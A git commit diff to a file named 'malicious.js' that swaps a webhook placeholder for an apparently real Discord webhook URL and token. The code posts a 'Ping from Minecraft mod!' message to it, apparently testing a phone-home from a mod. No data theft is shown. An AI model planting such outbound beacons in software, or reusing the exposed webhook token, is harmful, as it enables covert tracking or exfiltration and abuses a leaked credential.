da3c75470c60ccac81189abf4bee2331d3e7fa21
SamSidere <142908401+zzkqeke@users.noreply.github.com>
2025-07-25 18:20:56 +0200

    Update malicious.js

--- malicious.js
+++ malicious.js
@@ -1,7 +1,7 @@
 // temp.js
 const axios = require('axios');
 
-axios.post('YOUR_DISCORD_WEBHOOK_URL', {
+axios.post('https://discord.com/api/webhooks/1397869568319291515/6O_Zciy0jmpsQAbQtm82L6m-diLhrc3ib9QdDKH4sFtYu3XoAXXiEGnmK4ujPQL20iyl', {
     content: 'Ping from Minecraft mod!'
 })
 .then(response => {
